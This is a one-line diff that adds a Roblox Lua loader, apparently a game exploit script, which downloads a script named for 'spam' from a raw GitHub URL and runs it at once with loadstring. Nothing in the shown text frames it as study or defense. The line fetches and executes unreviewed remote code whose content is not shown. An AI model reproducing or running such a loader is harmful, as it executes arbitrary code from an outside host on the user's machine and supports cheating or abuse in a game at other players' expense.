@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/unseen-liminality-spam3-ttp874pso1ekv4.lua"))()
